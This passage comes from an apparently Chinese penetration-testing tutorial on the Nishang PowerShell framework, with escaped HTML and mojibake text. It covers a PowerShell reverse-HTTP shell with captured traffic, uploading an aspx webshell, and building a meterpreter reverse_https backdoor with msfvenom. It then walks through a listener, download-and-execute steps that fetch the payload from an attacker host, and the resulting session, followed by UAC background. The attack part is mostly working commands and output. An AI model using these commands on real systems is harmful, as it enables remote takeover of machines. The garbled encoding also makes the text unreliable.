&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;dString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://172.16.0.106:4446/connect&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;50434&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥ä½¿ç”¨&lt;code&gt;wireshark&lt;/code&gt;è¿›è¡ŒæŠ“åŒ…ç ”ç©¶ï¼Œçœ‹åˆ°æ˜¯é€šè¿‡httpæ–¹å¼è¿›è¡Œæ•°æ®ä¼ è¾“çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;whoami&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;POST /rat HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Host: 172.16.0.106:4446
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Content-Length: 23
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Expect: 100-continue
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;win-jh8n3kv3oq0\sc92n
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;HTTP/1.1 200 OK
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Content-Length: 6
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Server: Microsoft-HTTPAPI/2.0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Date: Sun, 23 Jan 2022 05:40:45 GMT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;whoamiGET /rat HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Host: 172.16.0.106:4446
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Httpsåˆ©ç”¨æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œä½¿ç”¨è¿™ä¸ªæ¨¡å—å³å¯&lt;code&gt;Invoke-PoshRatHttp&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h3 id=&#34;webshellåé—¨&#34;&gt;Webshellåé—¨&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªå¤§å®¶åº”è¯¥å¾ˆç†Ÿæ‚‰äº†ï¼ŒNishangä½¿ç”¨aspxçš„shellï¼Œé‡Œé¢ç”¨çš„æ˜¯powerhsellçš„å‘½ä»¤ï¼ŒæŠŠè„šæœ¬æ–‡ä»¶&lt;code&gt;Antak-WebShell\antak.aspx&lt;/code&gt;ä¸Šä¼ åˆ°ç½‘ç«™ç›®å½•å³å¯ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æƒé™æå‡-1&#34;&gt;æƒé™æå‡&lt;/h2&gt;
&lt;h3 id=&#34;ä¸‹è½½æ‰§è¡Œ&#34;&gt;ä¸‹è½½æ‰§è¡Œ&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Download_Execute&lt;/code&gt;æ˜¯Nishangä¸­çš„ä¸‹è½½æ‰§è¡Œè„šæœ¬ï¼Œå¸¸ç”¨äºä¸‹è½½æ–‡æœ¬æ–‡ä»¶ï¼Œç„¶åå°†å™¨è½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆåœ¨msfç”Ÿæˆä¸€ä¸ªexeåé—¨æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ msfvenom -p windows/x64/meterpreter/reverse_https  -f exe -o /home/kali/muma.exe                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No encoder specified, outputting raw payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload size: &lt;span class=&#34;m&#34;&gt;658&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Final size of exe file: &lt;span class=&#34;m&#34;&gt;7168&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Saved as: /home/kali/muma.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å»ºç«‹ç›‘å¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@kali:~# sudo msfconsole
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 &amp;gt; use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LHOST 172.16.0.107 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 172.16.0.107
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨kaliå»ºç«‹httpæœåŠ¡å™¨ï¼Œç„¶ååœ¨Windowsæ”»å‡»æœºä¸Šæ‰§è¡Œpowershellå‘½ä»¤ä¸‹è½½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;wget &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/muma.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-outfile&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;muma.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è½¬åŒ–æˆtxtæ–‡æœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExetoText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;muma&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;muma&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Converted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;written&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;muma&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå†æŠŠ&lt;code&gt;muma.txt&lt;/code&gt;æ”¾åˆ°ä¸€ä¸ªhttpæœåŠ¡å™¨ä¸­ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Download_Execute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;8000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;muma&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;msfå°±ä¸Šçº¿äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: 98lr6ix5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: 98lr6ix5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Attaching orphaned/stageless session...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: 98lr6ix5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.0.107:4444 -&amp;gt; 127.0.0.1 &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-01-23 14:06:06 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;éº»çƒ¦çš„å°±æ˜¯è¦åœ¨Windowsä¸Šé¢åˆ©ç”¨è¿™ä¸ªè„šæœ¬è¿›è¡Œè½¬æ¢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;bypass-uac-1&#34;&gt;Bypass UAC&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ç”¨æˆ·å¸æˆ·æ§åˆ¶&lt;/strong&gt;(User Account Control)æ˜¯Windows Vistaï¼ˆåŠæ›´é«˜ç‰ˆæœ¬æ“ä½œç³»ç»Ÿï¼‰ä¸­ä¸€ç»„æ–°çš„åŸºç¡€ç»“æ„æŠ€æœ¯ï¼Œå¯ä»¥å¸®åŠ©é˜»æ­¢æ¶æ„ç¨‹åºï¼ˆæœ‰æ—¶ä¹Ÿç§°ä¸ºâ€œæ¶æ„è½¯ä»¶â€œï¼‰æŸåç³»ç»Ÿï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å¸®åŠ©ç»„ç»‡éƒ¨ç½²æ›´æ˜“äºç®¡ç†çš„å¹³å°ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨UACï¼Œåº”ç”¨ç¨‹åºå’Œä»»åŠ¡æ€»æ˜¯åœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä½†ç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™æ—¶é™¤å¤–ã€‚UACä¼šé˜»æ­¢æœªç»æˆæƒåº”ç”¨ç¨‹åºçš„è‡ªåŠ¨å®‰è£…ï¼Œé˜²æ­¢æ— æ„ä¸­å¯¹ç³»ç»Ÿè®¾ç½®è¿›è¡Œæ›´æ”¹ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·å¸æˆ·æ§åˆ¶(UAC)æ˜¯&lt;strong&gt;æ–°ç‰ˆWindows&lt;/strong&gt;çš„æ ¸å¿ƒå®‰å…¨åŠŸèƒ½ï¼Œä¹Ÿæ˜¯å…¶æœ€å¸¸è¢«äººè¯¯è§£çš„ä¼—å¤šå®‰å…¨åŠŸèƒ½å½“ä¸­çš„ä¸€ç§ã€‚&lt;/p&gt;
&lt;p&gt;Windows Vista å¼€å§‹å¼•å…¥äº† UACï¼Œä¸è¿‡åœ¨ Windows Vista ä¸Šåªæœ‰ä¸¤ç§ UAC è®¾ç½®â€”â€”å¼€å¯å’Œå…³é—­ã€‚å¦‚æœå¼€å¯ï¼Œé‚£ä¹ˆåº”ç”¨è¯•å›¾å®‰è£…è½¯ä»¶æˆ–æ›´æ”¹è®¡ç®—æœºã€æˆ–è€…æ›´æ”¹äº† Windows è®¾ç½®æ—¶å°†å¼¹å‡º UAC æç¤ºæ¡†ï¼›å¦‚æœå…³é—­ï¼Œé‚£ä¹ˆ UAC å°±æ­¤å…³é—­ã€‚Windows Vista çš„ UAC ä¸€ç›´é¥±å—è¯Ÿç—…å°±æ˜¯å› ä¸ºè¿™ç§æƒ…å†µä¸‹çš„ UAC æç¤ºæ˜¯éå¸¸é¢‘ç¹çš„ï¼ˆè€Œä¸”ä»¥å‰çš„ç¨‹åºè¿ç§»åˆ°ä¸éœ€è¦ç®¡ç†å‘˜æƒé™éœ€è¦æ—¶é—´ï¼‰ã€‚&lt;/p&gt;
